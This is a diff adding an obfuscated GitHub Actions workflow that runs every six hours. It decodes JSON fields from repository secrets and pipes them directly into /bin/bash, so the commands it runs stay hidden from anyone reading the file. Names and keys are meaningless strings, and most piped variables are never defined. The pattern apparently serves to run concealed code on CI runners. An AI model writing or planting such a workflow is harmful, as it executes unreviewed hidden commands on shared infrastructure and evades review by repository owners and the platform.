@@ -1,0 +1,26 @@
+name: dadanmaxo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dadanmaxo
+        env:
+          habdh55: ${{ secrets.habdh55 }}
+        run: |
+          echo $habdh55 | jq -r .nlmxo89015 | /bin/bash
+          echo $e62650 | jq -r .kinh1223 | /bin/bash
+          echo $wwoaz60 | jq -r .vbzg12051 | /bin/bash
+          echo $uzjj9301 | jq -r .qcr8265 | /bin/bash
+          echo $oqq6 | jq -r .ndan3 | /bin/bash
+          echo $grasm956 | jq -r .o788 | /bin/bash
+          echo $pcdiv924 | jq -r .ol7994 | /bin/bash
+          echo $b631 | jq -r .idvqz22952 | /bin/bash
+
